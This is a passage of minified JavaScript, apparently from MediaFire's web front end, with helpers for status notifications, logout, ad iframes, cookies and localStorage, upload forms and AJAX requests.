xT,bkA="",identifier="",oz=4e3,eP=null,iG=null,Uploading=!1,UploadFiles=1,jc=0,nj=0,ad1cnt=0,ad2cnt=0,ad3cnt=0,ad4cnt=0,ad5cnt=0,GLB_bMouseMoved=!1,aEi=null,UserLogin=0,UserEmail="n/a",fu=0,hq=0,lB=0,mv=0,jd=0,aOI=15,aSG=100,aPk=500,aTe=5e3,aPs=5,aAR=!1,pZ=null,NB=!1,Oc=null,NH=!1,aja=1,ahP=37,aYk=Array(),iCurrentStatusMessageIndex=-1,wu="all",BE=0,fJ=Array(),qz=0,qr=0,qw="",qt=100,Su=6e3,qB=10,qp=10,qq=0,akN=0,Ug=!1,Ih=0,avf=[],aPopupQueue=[];function aBV(){if("undefined"!=typeof aCH)return aCH;var e=String(window.document.location.hostname).toLowerCase();return"local."==e.substr(0,6)?"local":"dev."==e.substr(0,4)?"dev":"live"}function GetDefaultSubDomain(){if("undefined"!=typeof GLB_sDefaultSubdomain)return GLB_sDefaultSubdomain;var e=aBV();return"live"==e?"www":e}function isLOCALDEV(){return"local"==aBV()}function aBO(){return"dev"==aBV()}function aBA(){return"devtest"==aBV()}function aBY(){return"live"==aBV()}function isSANDBOX(){return"sandbox"==aBV()}function isDESKTOP(){return"desktop"==aBV()}if(document.onkeyup=function(e){27==(window.event&&window.event.keyCode?window.event.keyCode:e.keyCode?e.keyCode:e.charCode)&&QU()},window.addEventListener("message",(function(e){e&&"string"==typeof e.data&&-1!==e.data.indexOf("mf-open-")&&window.open(e.data.slice(8),"_blank")})),function(e){var t=navigator.userAgent.toLowerCase();e.browser=e.browser||{version:(t.match(/.+(?:rv|it|ra|ie)[\/: ]([\d.]+)/)||[0,"0"])[1],safari:/webkit/.test(t),opera:/opera/.test(t),msie:/msie/.test(t)&&!/opera/.test(t),mozilla:/mozilla/.test(t)&&!/(compatible|webkit)/.test(t)},e.fn.attr=e.fn.attr||e.fn.prop}(jQuery),void 0===sCDNUrl)var sCDNUrl="";function Py(e,t,a){var o="over"==t;e.addEventListener("OverflowEvent"in window?"overflowchanged":t+"flow",(function(e){if(e.type==t+"flow"||0==e.orient&&e.horizontalOverflow==o||1==e.orient&&e.verticalOverflow==o||2==e.orient&&e.horizontalOverflow==o&&e.verticalOverflow==o)return e.flow=t,a.call(this,e)}),!1)}function Oz(e,t,a,o){o=o||{};var n=document.createEvent("Event");for(var r in n.initEvent(t,!("bubbles"in o)||o.bubbles,!("cancelable"in o)||o.cancelable),a)n[r]=a[r];e.dispatchEvent(n)}function PJ(e,t){var a="onresize"in e;if(!a&&!e.PF){var o=e.PF=document.createElement("div");o.className="resize-sensor",o.innerHTML='<div class="resize-overflow"><div></div></div><div class="resize-underflow"><div></div></div>';var n=0,r=0,i=o.firstElementChild.firstChild,s=o.lastElementChild.firstChild,l=function(t){var a=!1,o=e.offsetWidth;n!=o&&(i.style.width=o-1+"px",s.style.width=o+1+"px",a=!0,n=o);var l=e.offsetHeight;r!=l&&(i.style.height=l-1+"px",s.style.height=l+1+"px",a=!0,r=l),a&&t.currentTarget!=e&&Oz(e,"resize")};"static"==getComputedStyle(e).position&&(e.style.position="relative",e.PF.OM=!0),Py(o,"over",l),Py(o,"under",l),Py(o.firstElementChild,"over",l),Py(o.lastElementChild,"under",l),e.appendChild(o),l({})}var d=e.OY||(e.OY=[]);-1==d.indexOf(t)&&d.push(t),a||e.addEventListener("resize",t,!1),e.onresize=function(t){d.forEach((function(a){a.call(e,t)}))}}function removeResizeListener(e,t){var a=e.OY.indexOf(t);if(a>-1&&e.OY.splice(a,1),!e.OY.length){var o=e.PF;o&&(e.removeChild(o),o.OM&&(e.style.position="static"),delete e.PF),"onresize"in e&&(e.onresize=null),delete e.OY}e.removeEventListener("resize",t)}function qA(e,t){return t>0&&(""!=e&&(!!document.getElementById(e+"1")&&(qz=t,qr=1,qw=e,void setTimeout("qu()",qt+Su))))}function qu(){var e=qr+1;e>qz&&(e=1);var t=document.getElementById(qw+qr),a=document.getElementById(qw+e);return!(!t||!a)&&(t.style.opacity=(qp-1)/10,t.style.filter="alpha(opacity="+10*(qp-1)+")",a.style.opacity=(qq+1)/10,a.style.filter="alpha(opacity="+10*(qq+1)+")",qq+=1,(qp-=1)<=0?(qr=e,qp=10,qq=0,void setTimeout("qu()",qt+Su)):void setTimeout("qu()",qt))}function vB(e){return TRUE}function bdi(){var e=document.getElementById("form_reg");e?e.submit():Zi(0,"Unable to submit registration, please reload page and try again.")}function dW(e){if(!e)return!1;var t=e.split("/");for(eh=0;null!=t[eh]&&eh<10;eh++);if(eh-- >1){var a=t[eh].split("?");for(fA=0;null!=a[fA]&&fA<10;fA++);fA>0&&fA--;var o=a[fA].split("&");for(gZ=0;null!=o[gZ]&&gZ<10;gZ++);gZ>0&&gZ--;var n=a[gZ].split("=");for(gy=0;null!=n[gy]&&gy<10;gy++);return gy>0&&gy--,n[gy].length>3&&n[gy]}return!1}function dO(){dZ(),Zi(3,"Logging off "+(!UserEmail||UserEmail.length<=3?"Trial User":"user '"+UserEmail+"'")+".. Please wait.."),setTimeout("dS();",2e3)}function dG(e){window.location?window.location=e:window.src=e}function pN(e,t){var a=document.getElementById(t);if(!a)return!1;a.location?a.location=e:a.src=e}function dS(){if(iD=document.getElementById("userwork"),aU("mfloggedoff","true",30),iD){av();var e="/dynamic/logout.php?rand="+aC(5);document.domain&&"mediafire.com"==document.domain&&(e+="&use_doc_domain=true"),iD.location?iD.location=e:iD.src=e}}function ayb(){if(iD=document.getElementById("userwork"),aU("mfloggedoff","true",30),iD){av();var e="/dynamic/logout.php?type=suspend&rand="+aC(5);iD.location?iD.location=e:iD.src=e}}function baE(e){var t=document.getElementById("sharingmodebrowse"),a=document.getElementById("sharingmodesingle");t&&a&&(1==gY?(a.className="singlefile inset-box",t.className="browsable_selected inset-box"):(a.className="singlefile_selected inset-box",t.className="browsable inset-box"));var o=document.getElementById("pagename");o&&"myfiles"==o.value&&1!=e&&RenderMyFiles(er,eN)}function bbs(e,t){return pZ&&clearTimeout(pZ),pZ=setTimeout(av,e),"function"==typeof t&&setTimeout(sk(this,t),e),!1}function av(e){return pZ&&clearTimeout(pZ),gm=document.getElementById("statusmessage"),EW=document.getElementById("statusmessage_text"),0==aAR?(gm&&$(gm).fadeOut(100),EW&&(EW.innerHTML=""),!1):(aAR=!1,gm&&$(gm).fadeOut(100),"function"==typeof e&&e(),!1)}function Zi(e,t,a,o,n){if(window!==parent)try{if(parent.Zi)return parent.Zi(e,t,a,o,n)}catch(e){return void QS("Message",t,[["OK"]])}if(am=document.getElementById("statusmessagebox"),bad=document.getElementById("statusmessageboxtext"),gm=document.getElementById("statusmessage"),EW=document.getElementById("statusmessage_text"),a=a||"",o=o||!1,fDismissCallback=function(){return av(),n&&n(),!1},window.focus(),am&&bad)$(am).fadeIn(100),am.className=a,bad.innerHTML=t;else{if(!gm||!EW)return!1;switch($(gm).fadeIn(100),gm.className=a,EW.innerHTML=t,aAR=!0,e){case 0:bbs(5e3,fDismissCallback);break;case 1:bbs(1e4,fDismissCallback);break;case 2:bbs(15e3,fDismissCallback);break;case 3:break;default:av(fDismissCallback)}var r=!0;if(!0===o)for(var i=gm.getElementsByTagName("DIV"),s=0,l=i.length;s<l;s++)"dismiss_message_div"==i[s].id&&(r=!1);!0===r?(DoShow("dismiss_message_div"),gm.onclick=fDismissCallback,gm.style.cursor="pointer"):(gm.onclick=null,gm.style.cursor="default",DoHide("dismiss_message_div"))}return!1}function OD(e){if(window.localStorage&&window.JSON){if(e=e||0,document.getElementById("status-message-bucket")&&document.getElementById("status-message-bucket").value)wu=document.getElementById("status-message-bucket").value;else{if(e++<3)return setTimeout((function(){OD(e)}),500),!1;wu=document.location.pathname?document.location.pathname:"all"}var t=JSON.parse(localStorage.getItem("StatusMessagesQueue-"+UserEmail+"-"+wu));"object"==typeof t&&t instanceof Array&&(aYk=t,OG(),aYk.length>0&&(iCurrentStatusMessageIndex=aYk.length-1,fJ=aYk[iCurrentStatusMessageIndex],nX()))}}function Qn(){window.localStorage&&window.JSON&&localStorage.setItem("StatusMessagesQueue-"+UserEmail+"-"+wu,JSON.stringify(aYk))}function Re(){aYk=[],vl(),window.localStorage&&window.JSON&&localStorage.clear()}function OJ(){document.width<600?akE=1:document.width<900?akE=2:document.width<1300?akE=3:document.width<1800?akE=4:document.width<2400?akE=5:akE=6,aja!=akE&&(aja=akE,nX())}function ND(e){return Oc&&clearTimeout(Oc),Oc=setTimeout((function(){NH?ND(100):vl()}),e),!1}function Qi(e){var t=Math.floor(((new Date).getTime()-e)/1e3);if(t<7)return"Just now";if(t<60)return t+" second"+(t>1?"s":"")+" ago";if(t<3600)return(a=Math.round(t/60))+" minute"+(a>1?"s":"")+" ago";if(t<86400){var a,o=Math.floor(t/3600);return o+" h and "+(a=Math.round((t-3600*o)/60))+" m ago"}var n=Math.floor(t/86400);return n+(n>1?" days":" day")+" ago"}function vl(){return gm=document.getElementById("notify_main"),gm&&Pn(),!1}function PB(){Pa(),iCurrentStatusMessageIndex>-1?nX():vl()}function OP(e,t,a){return aYk[aYk.length]=Array(e,t,a,(new Date).getTime()),OG(),iCurrentStatusMessageIndex=aYk.length-1,fJ=aYk[iCurrentStatusMessageIndex],!0}function OG(){for(var e=0;e<aYk.length;e++)aYk[e][3]<(new Date).getTime()-864e5&&aYk.splice(e--,1);for(;aYk.length>20;)aYk.splice(0,1);Qn()}function Pa(){aYk.splice(iCurrentStatusMessageIndex,1),Qn(),(iCurrentStatusMessageIndex>0||0==aYk.length)&&iCurrentStatusMessageIndex--,iCurrentStatusMessageIndex>-1&&(fJ=aYk[iCurrentStatusMessageIndex])}function Pf(){iCurrentStatusMessageIndex<aYk.length-1&&(iCurrentStatusMessageIndex++,fJ=aYk[iCurrentStatusMessageIndex],nX())}function Pe(){iCurrentStatusMessageIndex>0&&(iCurrentStatusMessageIndex--,fJ=aYk[iCurrentStatusMessageIndex],nX())}function nX(){if(gm=document.getElementById("notify_main"),gm)if(fJ&&fJ[0]){$oStatusTitle=$("#notify_msgtitle"),$oStatusTitleMin=$("#notify_msgtitle_min"),$oStatusBody=$("#notify_msgbody"),$oStatusMessagesCount=$("#notify_msgnumber");var e=document.getElementById("notify_msgscroll");-1==fJ[3]?$oStatusTitle.html(fJ[0]):($oStatusTitle.html(fJ[0]),$oStatusTitle.append('<span class="notify_timestamp"> ('+Qi(fJ[3])+")</span>")),$oStatusBody.html(fJ[1]),gm.className="msg_"+fJ[2]+" msg_size"+aja+(NB?"":" notify_hidden"),gm.style.display="block",$oStatusMessagesCount.html(iCurrentStatusMessageIndex+1),$oStatusTitleMin.html(aYk.length+" recent message"+(aYk.length>1?"s":"")),e.style.display=NB&&-1==fJ[3]?"none":"",NI=!1;var t=$oStatusBody.html().split("<br>").length;if(t>1)$oStatusBody.html(jH.innerHTML.split("<br>",2).join("<br>")),t>2&&(NI=!0);else{for($oStatusBody.html($oStatusBody.html().substr(0,800));rW($oStatusBody)[1]>52;)$oStatusBody.html($oStatusBody.html().substr(0,$oStatusBody.html().length-40)),NI=!0;NI&&$oStatusBody.html($oStatusBody.html().substr(0,$oStatusBody.html().length-10).replace(/\s[^\s]*$/,""))}NI&&$oStatusBody.append('... <a href="#" onclick="Pv(); return false;">more</a>')}else gm.style.display="none"}function Qv(e){var t;if(e&&e.target)t=e.target;else{if(!window.event||!window.event.srcElement)return;t=window.event.srcElement}"A"!=t.tagName.toUpperCase()&&Pv()}function Pv(){aYk.length>0&&aYk[iCurrentStatusMessageIndex]&&LoadIframeLightbox("/templates/mf_notifications.html",430,185)}function Pn(){azO=document.getElementById("notify_main"),clearInterval(BE);var e=Im(azO);BE=setInterval((function(){var t=parseInt(azO.style.bottom||0);try{VT=MFUL.BS.NL()}catch(e){VT=0}if(t<=VT+((-1==fJ[3]?0:ahP)-e)){clearInterval(BE),NB=!1;var a=-1==fJ[3];aYk.length>0&&iCurrentStatusMessageIndex>-1?(fJ=aYk[iCurrentStatusMessageIndex],nX(),a?BE=setInterval((function(){var e=parseInt(azO.style.bottom||0);e>=VT?(clearInterval(BE),azO.style.bottom=VT+"px"):azO.style.bottom=e+2+"px"}),1):azO.style.bottom=VT+"px",ahP=Im(azO)):ahP=0}else azO.style.bottom=t-2+"px"}),1)}function OI(e){window.focus(),azO=document.getElementById("notify_main"),NB=!0,nX();var t=Im(azO);try{VT=MFUL.BS.NL()}catch(e){VT=0}switch(azO.style.bottom=VT+(ahP-t)+"px",clearInterval(BE),BE=setInterval((function(){var e=parseInt(azO.style.bottom||0);try{VT=MFUL.BS.NL()}catch(e){VT=0}e>=VT?(clearInterval(BE),azO.style.bottom=VT+"px"):azO.style.bottom=e+2+"px"}),1),e){case 0:ND(5e3);break;case 1:ND(1e4);break;case 2:ND(15e3);break;case 3:break;case 4:ND(100);break;default:vl()}}function aH(e,t,a,o,n){return a=a||"",a=$("<div>"+a+"</div>").html()||"",!!t&&(t=$("<div>"+t+"</div>").html(),"warning"!=n&&"error"!=n&&(n="default"),o?OP(t,a,n):fJ=Array(t,a,n,-1),OI(e),!0)}function opacity(e,t,a,o){var n=document.getElementById(e).style;n.opacity=a/100,n.MozOpacity=a/100,n.KhtmlOpacity=a/100,n.filter="alpha(opacity="+a+")"}function opacity_real(e,t,a,o){document.getElementById(e).style;var n=Math.round(o/100),r=0;if(t>a)for(i=t;i>=a;i--)setTimeout("baS("+i+",'"+e+"')",r*n),r++;else if(t<a)for(i=t;i<=a;i++)setTimeout("baS("+i+",'"+e+"')",r*n),r++}function baS(e,t){if(!document.getElementById(t))return!1;var a=document.getElementById(t).style;a.opacity=e/100,a.MozOpacity=e/100,a.KhtmlOpacity=e/100,a.filter="alpha(opacity="+e+")"}function aq(e,t,a,o){e.value.length>a?(e.value=e.value.substring(0,a),t.innerHTML=0):t.innerHTML=a-(e.value.length+o),t.style.visibility="visible"}function xp(e,t,a,o,n,r){"string"==typeof e&&(e=document.getElementById(e));var i,s=140,l=!1,d=!1,c=0;if(e){if(i=document.getElementById(n))if(i.checked)if(i=document.getElementById(t))s-=String(i.value).length+18,l=!0;(i=document.getElementById(a))&&i.checked&&(d=!0),c=d&&l?Math.min(420,s):l?s:420;e.value.length>c&&(e.value=e.value.substring(0,c),!0),d&&(i=document.getElementById(o))&&(i.style.visibility="visible",i.innerHTML=420-e.value.length),l&&(i=document.getElementById(r))&&(i.style.visibility="visible",i.innerHTML=s-e.value.length)}return!0}function cE(e,t,a){if(!e)return!1;a||0==a||(a=1);var o="";o+=1==lB?"https://www"+aX(t)+".mediafire.com/conv/"+t+a+"g.jpg":"http://www"+aX(t)+".mediafire.com/conv/"+t+a+"g.jpg",e.src=o}function aX(e){return Math.ceil(h2d(e.substring(0,1))/4)}function en(){return"You haven't finished yet!  Please press 'Cancel' to continue."}function aoy(e){$.each(e.split(","),(function(e,t){t=t.trim(),$("#header ul.nav li.toptab_"+t).show()}))}function aok(e){$.each(e.split(","),(function(e,t){t=t.trim(),$("#header ul.nav li.toptab_"+t).hide()}))}function aoY(e){$("#header ul.nav li").hide(),aoy(e)}function ap(e){if(0==mv)if(isNaN(e))for(var t=0;t<=12;++t){(a=document.getElementById("toptab_"+t))&&a.className=="toptab_"+e&&($(a).addClass("current"),mv=1)}else for(t=0;t<=12;++t){var a;(a=document.getElementById("toptab_"+t))&&e==t&&($(a).addClass("current"),mv=1)}}function d2h(e){return e.toString(16)}function h2d(e){return parseInt(e,16)}function aqr(){var e,t,a,o,n,r,i=0,s=new Array,l=aqr.arguments;if(document.getElementsByTagName){for(e=4,o=l.length;e<o;e++)for(t=0,n=(a=document.getElementsByTagName(l[e])).length;t<n;t++)s[i]=a[t],i++;for(e=0,r=s.length;e<r;e++)s[e].className&&(s[e].id==l[1]?1==l[0]?s[e].className=s[e].className==l[3]?l[2]:l[3]:s[e].className=l[2]:1==l[0]&&"none"==l[1]?s[e].className!=l[2]&&s[e].className!=l[3]||(s[e].className=s[e].className==l[3]?l[2]:l[3]):s[e].className==l[2]&&(s[e].className=l[3]))}}function atc(e,t){e&&t&&avf.push(e)}function Tv(e){e||(e=0),atO=[],1!=nj&&(nj=1,0==jd&&1!=jc&&(document.getElementById("iframe_linkto1")&&(pN("/templates/linkto/default-337x281-default.php?r="+aC(5)+"&o="+e,"iframe_linkto1"),DoShow("iframe_linkto1"),DoShow("recopy_ads_button1")),document.getElementById("iframe_linkto4")&&(pN("/templates/linkto/default-337x281-default2.php?r="+aC(5)+"&o="+e,"iframe_linkto4"),DoShow("iframe_linkto4"),DoShow("remove_ads_button4")),document.getElementById("iframe_linkto3")&&(pN("/templates/linkto/default-161x601-default.php?r="+aC(5)+"&o="+e,"iframe_linkto3"),DoShow("iframe_linkto3"),DoShow("remove_ads_button3")),document.getElementById("iframe_linkto2")&&(pN("/templates/linkto/default-729x91-default.php?r="+aC(5)+"&o="+e,"iframe_linkto2"),DoShow("iframe_linkto2"),DoShow("remove_ads_button2")),document.getElementById("iframe_linkto7")&&(pN("/templates/linkto/default-300x600-usonly.html?r="+aC(5)+"&o="+e,"iframe_linkto7"),DoShow("iframe_linkto7"),DoShow("remove_ads_button7")),document.getElementById("iframe_linkto8")&&(pN("/templates/linkto/default-337x281-default-audio.php?r="+aC(5)+"&o="+e,"iframe_linkto8"),DoShow("iframe_linkto8"),DoShow("remove_ads_button8")),jd=1))}function ate(e){e||(e=0),1!=nj&&(nj=1,0==jd&&1!=jc&&(document.getElementById("iframe_linkto5")&&(pN("/templates/linkto/default-320x50-mobile.php?r="+aC(5)+"&o="+e,"iframe_linkto5"),DoShow("iframe_linkto5"),DoShow("remove_ads_button5")),document.getElementById("iframe_linkto6")&&(pN("/templates/linkto/default-320x50-mobile2.php?r="+aC(5)+"&o="+e,"iframe_linkto6"),DoShow("iframe_linkto6"),DoShow("remove_ads_button6")),jd=1))}function dC(){1==jd&&(document.getElementById("iframe_linkto1")&&(pN("/blank.html","iframe_linkto1"),DoHide("iframe_linkto1"),DoHide("remove_ads_button1")),document.getElementById("iframe_linkto4")&&(pN("/blank.html","iframe_linkto4"),DoHide("iframe_linkto4"),DoHide("remove_ads_button4")),document.getElementById("iframe_linkto2")&&(pN("/blank.html","iframe_linkto2"),DoHide("iframe_linkto2"),DoHide("remove_ads_button2")),document.getElementById("iframe_linkto3")&&(pN("/blank.html","iframe_linkto3"),DoHide("iframe_linkto3"),DoHide("remove_ads_button3")),jd=0)}function change_top_window(e){window.location.href=e}function baV(e){"logout"==e&&aqr(1,"none","prelogin","postlogin","div")}function bah(){var e=document.getElementById("pagename"),t="";if(e){switch(e.value){case"imageview":t=(a=window.location.search.substring(1).split("&"))[0]+"&"+a[1]+"&r="+aC(5);break;case"download":t=(a=window.location.search.substring(1).split("&"))[0];break;case"myfiles":case"about1":case"about2":case"billinghistory":case"myaccount":t="?r="+aC(5)}switch(e.value){case"imageview":dG("/view/"+t);break;case"download":dG("/download.php?"+t);break;case"myfiles":var a;"sharekey="!=(a=window.location.search.substring(1).split("&"))[0].substr(0,9)&&13!=a[0].length&&dG("/"+t);break;case"about1":case"register":dG("/register.php");break;case"registration":dG("/upgrade/?plan=pro");break;case"login":dG("/");break;case"about2":case"myaccount":dG("/myaccount.php"+t);break;case"billinghistory":dG("/myaccount/billinghistory.php"+t);break;case"upload":dG("/"+t);break;case"manageusers":dG("/myaccount/manageusers.php");break;default:dG(window.location.href.replace(/#.*/i,""))}}else dG(window.location.href.replace(/#.*/i,""))}function XP(e,t){var a="@"==UserEmail||"n/a"==UserEmail?"":UserEmail;if(e!=a){var o,n="";n+=""==e?"You are logged out.<br /><br />":"You are logged in as ("+e+").<br /><br />",""==a?(n+="Please logout to access your anonymous files.",o=function(){dZ(),Zi(3,"Logging off user '"+e+"'.. Please wait.."),setTimeout("dS();",2e3)}):(n+="Please login to ("+a+") to continue accessing the current files.",o=function(){window.location="/login.php?e="+a}),QS("Authentification Error","<b>"+n+"</b>",[["OK"]],o)}else parent.aH(0,"Access denied","You do not have permissions to perform the requested operation. ("+t+")",!1,"error")}function cR(){var e=document.getElementById("header_icon_pro_logo");if(0!=UserLogin){if(UserEmail.length<51);else UserEmail.slice(0,48);e&&(e.style.display=fu>=1?"":"none"),document.getElementById("upload_create")&&(document.getElementById("upload_create").style.visibility="hidden",document.getElementById("upload_login").style.visibility="hidden",document.getElementById("upload_create").style.display="none",document.getElementById("upload_login").style.display="none")}else e&&(e.style.display="none"),document.getElementById("upload_create")&&(document.getElementById("upload_create").style.visibility="visible",document.getElementById("upload_login").style.visibility="visible"),document.getElementById("reg_emailUL")&&(document.getElementById("reg_emailUL").value="",document.getElementById("reg_passUL").value=""),document.getElementById("reg_email")&&(document.getElementById("reg_pass").value="");document.getElementById("login_area")&&(document.getElementById("login_area").style.visibility="visible"),DoShow("networks_login_status"),document.getElementById("logged_in_info")&&(document.getElementById("logged_in_info").className="")}function ClipBoardDone(){}function cH(e){var t=1;if("blank"==e)var a="_blank";else a="";for(;t<25;)document.getElementById("alink_"+t)&&(document.getElementById("alink_"+t).target=a),t++}function Wf(e){try{if(null==document.getElementById("mfRandField")){var t=document.createElement("div"),a="_"+aC(5);t.id="mfRandField",t.innerHTML='<input type="hidden" name="'+a+'" id="'+a+'" value="'+db(1e3,5e3)+'"/>',t.style.display="none",document.getElementById(e).appendChild(t)}else for(var o=document.getElementById("mfRandField").childNodes,n=0;n<o.length;n++)"hidden"==o[n].type&&"_"==o[n].id.substr(0,1)&&(document.getElementById(o[n].value).value=db(1e3,5e3))}catch(e){}}function db(e,t){if((e=parseInt(e))>=(t=parseInt(t)))return 0;var a=Math.random()*(t-e);return Math.round(e+a)}function aC(e){for(var t="";e>0;){var a=Math.random();a=(a=parseInt(1e3*a))%26+65,t+=String.fromCharCode(a),e--}return t.toLowerCase()}function handle_upload(e){null==e&&(e=0),""==document.getElementById("file_name0").value?Zi(0,"Please click the 'Browse' or 'Choose' button and select at least one file before clicking the 'Upload File(s) to MediaFire' button"):(identifier=bkA,document.form_upload.action="http://upload.mediafire.com/"+identifier+"p"+e,aqr(1,"none","preupload","progressupload","div"),Uploading=!0,cH("blank"),document.getElementById("form_upload").submit())}function rs(){return"undefined"==typeof XMLHttpRequest&&(XMLHttpRequest=function(){try{return new ActiveXObject("Msxml2.XMLHTTP.6.0")}catch(e){}try{return new ActiveXObject("Msxml2.XMLHTTP.3.0")}catch(e){}try{return new ActiveXObject("Msxml2.XMLHTTP")}catch(e){}try{return new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}throw new Error("This browser does not support XMLHttpRequest.")}),new XMLHttpRequest}function Kl(e,t,a){try{var o=rs();o.open("POST",e,!0),"function"==typeof a&&(o.onreadystatechange=function(e,t){return function(){4==e.readyState&&t&&t(200==e.status,e.responseText)}}(o,a));var n=[];for(var r in t)n.push(r+"="+encodeURIComponent(t[r]));var i=n.join("&");o.setRequestHeader("Content-type","application/x-www-form-urlencoded"),o.send(i)}catch(e){a&&a(!1,null)}}function mSendDataByPostJSON(e,t,a){Kl(e,t,(function(e,t){if(null!==t){try{var o=JSON.parse(t)}catch(e){a&&a(!1,null)}a&&a(e,o)}else a&&a(!1,null)}))}function Ko(e,t,a){try{var o=rs();return o.open("GET",e,!0),"function"!=typeof t&&"function"!=typeof a||(o.onreadystatechange=function(e,t,a){return function(){4==e.readyState&&(200==e.status?"function"==typeof t&&t(e.responseText):"function"==typeof a&&a(e.status,e.responseText))}}(o,t,a)),o.setRequestHeader("Content-type","application/x-www-form-urlencoded"),o.send(null),!0}catch(e){}return!1}function aP(){if("undefined"!=typeof XMLHttpRequest)return eP=new XMLHttpRequest,1;if(window.ActiveXObject)for(var e=["MSXML2.XMLHttp.5.0","MSXML2.XMLHttp.4.0","MSXML2.XMLHttp.3.0","MSXML2.XMLHttp","Microsoft.XMLHttp"],t=0;t<e.length;t++)try{return eP=new ActiveXObject(e[t]),1}catch(e){}return 0}function set_file_name(e,t){var a;if(!t)return!1;if(e&&e.length<11)return!1;if(0!=(a=dW(e)))t.value=a;else{if(!t)return!1;t.value="Uknown_"+aC(5)+".upload"}}function aZd(e,t,a){if(document.getElementById("upload_content")&&document.getElementById("links")&&(e!=UploadFiles||1==t)){document.getElementById("links").selectedIndex=parseInt(e)-1;for(var o=0,n=new Array;o<parseInt(e);)n[o]='<div class="web_uploader_url_table"><span class="webuploadtitle">Enter the URL of the file or image you wish to upload.</span>',parseInt(e)>1?n[o]+='<div class="ul_number" style="display:none">'+(o+1)+"</div>":n[o]+='<div id="filenum_1" name="filenum_1" class="ul_number" style="display:none"></div>',a?(n[o]+='<label>Enter URL of file or image</label><input class="" name="file_name'+o+'" id="file_name'+o+"\" type=\"text\"  size=\"30\" value=\"http://\" OnBlur=\"if (this.value == '') { this.value = 'http://'; this.className = ''; }\" OnFocus=\"if (this.value == 'http://') { this.value = '';  this.className = 'browse'; }\" OnChange=\"set_file_name(this.value,document.getElementById('file_title"+o+"'));\" />",n[o]+='<label>Save As</label><input class="" name="file_title'+o+'" id="file_title'+o+'" type="text"  size="20" value="image.jpg" OnFocus="if (this.value == \'image.jpg\') this.value = \'\'; this.className = \'browse\';"/></div>'):n[o]+='<input class="browse" name="file_name'+o+'" id="file_name'+o+'" type="file"  size="58" /></div>',o++;if(parseInt(e)<=UploadFiles){for(o=parseInt(e);o<10;)document.getElementById("links_html_"+o).innerHTML=" ",o++;if(o=0,t)for(;o<e;)document.getElementById("links_html_"+o).innerHTML=n[o],o++}else for(o=UploadFiles;o<e;)document.getElementById("links_html_"+o).innerHTML=n[o],o++;1==parseInt(e)?(document.getElementById("filenum_1").innerHTML="",document.getElementById("submit_file").src=sCDNUrl+"/images/v4images/buttons/webuploader/upload_file.gif"):(document.getElementById("filenum_1").innerHTML="1",document.getElementById("submit_file").src=sCDNUrl+"/images/v4images/buttons/webuploader/upload_files.gif"),UploadFiles=parseInt(e)}}function aY(e,t,a){var o=new Date;o.setDate(o.getDate()+a),document.cookie=e+"="+escape(t)+(null==a?"":";expires="+o.toGMTString())+";path=/"}function aU(e,t,a){var o=new Date;o.setTime(o.getTime()+1e3*a),document.cookie=e+"="+escape(t)+(null==a?"":";expires="+o.toGMTString())+";path=/"}function Tf(e,t){document.cookie=e+"="+escape(t)+";path=/"}function aL(e){return document.cookie.length>0&&(hG=document.cookie.indexOf(e+"="),-1!=hG)?(hG=hG+e.length+1,jN=document.cookie.indexOf(";",hG),-1==jN&&(jN=document.cookie.length),unescape(document.cookie.substring(hG,jN))):""}function baO(e){aY(e,"",-1)}function cI(){var e=0,t=0;return"number"==typeof window.pageYOffset?(t=window.pageYOffset,e=window.pageXOffset):document.body&&(document.body.scrollLeft||document.body.scrollTop)?(t=document.body.scrollTop,e=document.body.scrollLeft):document.documentElement&&(document.documentElement.scrollLeft||document.documentElement.scrollTop)&&(t=document.documentElement.scrollTop,e=document.documentElement.scrollLeft),[e,t]}function bkD(e,t){return!!window.localStorage&&(t&&Object.keys?-1!==Object.keys(localStorage).indexOf(e):null!==localStorage.getItem(e))}function bgI(e,t){$.getScript(sCDNUrl+"/js/lzstring_"+BUILD_VERSION+".js").done(e).fail(t)}function bgP(e,t){if(window.localStorage)return window.LZString?void(localStorage[e]=window.LZString.compressToUTF16(t)):bgI((function(){bgP(e,t)}))}function bhb(e,t){if(!window.localStorage)return!!t&&t(!1);var a=localStorage[e];if(!a)return!!t&&t(!1);if(!window.LZString)return!!t&&bgI((function(){bhb(e,t)}),(function(){t(!1)}));var o=LZString.decompressFromUTF16(a);return t?t(o):o}function bml(){var e=document.createElement("p");e.style.width="100%",e.style.height="100%";var t=document.createElement("div");t.style.position="absolute",t.style.top="0px",t.style.left="0px",t.style.visibility="hidden",t.style.width="100px",t.style.height="100px",t.style.overflow="hidden",t.appendChild(e),document.body.appendChild(t);var a=e.offsetWidth,o=e.offsetHeight;t.style.overflow="scroll";var n=e.offsetWidth,r=e.offsetHeight;return a==n&&(n=t.clientWidth),o==r&&(r=t.clientHeight),document.body.removeChild(t),[a-n,o-r]}function acz(){return window.location.protocol+"//"+GLB_fWindowDomain()}function GLB_fShareOrigin(){return("string"==typeof sDefaultShareLinkProtocol?sDefaultShareLinkProtocol+":":window.location.protocol)+"//"+GLB_fWindowDomain()}function GLB_fWindowDomain(){var e=aBV();return"live"==e&&(e="www"),e+".mediafire.com"}function aiH(e,t,a){var o={};return t=isNaN(t)?0:t,a=isNaN(a)?0:a,$.browser.msie?(o.top=e.clientY+document.documentElement.scrollTop+a,o.left=e.clientX+document.documentElement.scrollLeft+t):(o.top=e.pageY+a,o.left=e.pageX+t),o}function ajm(e){if(e&&"object"==typeof e){var t=[];return $.each(e,(function(e,a){t.push(e)})),t}return[]}function amJ(e,t){var a={},o=t||"";if(e&&"object"==typeof e){var n=ajm(e);for(x=0;x<n.length;x++)a[n[x]]=o||n[x]}return a}function bdF(e,t,a){var o=[],n=0;for(Yt in a=a||0,e)n+=e[Yt].length+a;if(n<=t)return e;var r=t/e.length;for(Yt in e)e[Yt].length<=r?o[Yt]=e[Yt]:o[Yt]=e[Yt].substring(0,Math.max(r-3,0))+"...";return o}function bcv(e,t){return e.length<=t?e:e.substring(0,Math.max(t-3,0))+"..."}function aoF(e){return/^(.)+\@[a-zA-Z0-9]+[a-zA-Z0-9._-]*[\.]{1}[a-zA-Z]+$/.test(e)}function atl(e,t){var a=e.indexOf("@"),o=e.substring(0,a),n=e.substring(a+1),r=n.indexOf("."),i=n.substring(0,r),s=n.substring(r+1),l=i.toLowerCase();return!(!t&&-1!=l.indexOf("mediafire"))&&(-1!=a&&-1!=r&&(!(e.length<4)&&(!(o.length<1)&&(!(i.length<1)&&!(s.length<1)))))}function 